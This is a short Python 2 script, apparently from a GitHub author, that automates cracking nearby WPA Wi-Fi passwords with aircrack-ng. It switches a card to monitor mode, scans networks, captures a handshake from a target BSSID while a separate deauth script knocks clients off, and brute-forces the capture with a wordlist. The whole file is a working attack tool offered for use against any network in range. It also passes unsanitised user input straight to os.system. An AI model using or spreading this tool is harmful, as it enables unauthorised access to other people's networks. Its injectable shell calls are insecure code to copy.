#! /usr/bin/python
# -*- coding: utf-8 -*-

"""
A small script to help you crack nearby wireless networks.
this script uses aircrack-ng suite

Author: yelhamer (github.com/yelhamer)
"""

from os import system

from termcolor import colored

logo = """
 █     █░██▓ ███████▓▄████▄  ██▀███  ▄▄▄      ▄████▄  ██ ▄█▓█████ ██▀███  
▓█░ █ ░█▓██▓██   ▓██▒██▀ ▀█ ▓██ ▒ ██▒████▄   ▒██▀ ▀█  ██▄█▒▓█   ▀▓██ ▒ ██▒
▒█░ █ ░█▒██▒████ ▒██▒▓█    ▄▓██ ░▄█ ▒██  ▀█▄ ▒▓█    ▄▓███▄░▒███  ▓██ ░▄█ ▒
░█░ █ ░█░██░▓█▒  ░██▒▓▓▄ ▄██▒██▀▀█▄ ░██▄▄▄▄██▒▓▓▄ ▄██▓██ █▄▒▓█  ▄▒██▀▀█▄  
░░██▒██▓░██░▒█░  ░██▒ ▓███▀ ░██▓ ▒██▒▓█   ▓██▒ ▓███▀ ▒██▒ █░▒████░██▓ ▒██▒
░ ▓░▒ ▒ ░▓  ▒ ░  ░▓ ░ ░▒ ▒  ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ░▒ ▒  ▒ ▒▒ ▓░░ ▒░ ░ ▒▓ ░▒▓░
  ▒ ░ ░  ▒ ░░     ▒ ░ ░  ▒    ░▒ ░ ▒░ ▒   ▒▒ ░ ░  ▒  ░ ░▒ ▒░░ ░  ░ ░▒ ░ ▒░
  ░   ░  ▒ ░░ ░   ▒ ░         ░░   ░  ░   ▒  ░       ░ ░░ ░   ░    ░░   ░ 
    ░    ░        ░ ░ ░        ░          ░  ░ ░     ░  ░     ░  ░  ░     
                    ░                        ░                            
"""

intro = """This is a simple script that cracks nearby wireless networks passwords
First, enter your wireless card (usually wlan0) then hit enter
It will give you a list of all available wireless networks in your area
Copy their BSSID and channel number and save them for later
Let\'s rock!"""

print colored(logo, 'green')
print colored(intro, 'green')

# asks for wireless card to apply monitor mode on it
wireless_card = raw_input("Enter your wireless card: ")

# turns wireless card into monitor mod
mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
system(mon0)

# runs a scan with airodump-ng to get available wifi
airodump = 'airodump-ng {0}'.format(wireless_card)
system(airodump)

# asks for your target's bssid
bssid = raw_input("Enter the BSSID of the network you want to crack :")

# asks for your target's channel
channel = raw_input("Enter the channel number that the wireless network is currently running on:")
save = raw_input("Where should i save the captured handshake ?")
print colored("...", "red"),
print colored("Airodump will start, in the meanwhile, run deauth.py in a new terminal", "red")

# starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
system(airodump2)
print colored("Handshake is captured", "green")
print colored("Cracking the handshake with aircrack-ng is starting...", "green")

# 'Aircrack-ng' parameters set
wordlist = raw_input("Specify the path to your wordlist dictionary: ")
save2 = raw_input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
print colored("This could take a while according to the wordlist you are using, so be patient!", "red")
crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
system(crack)
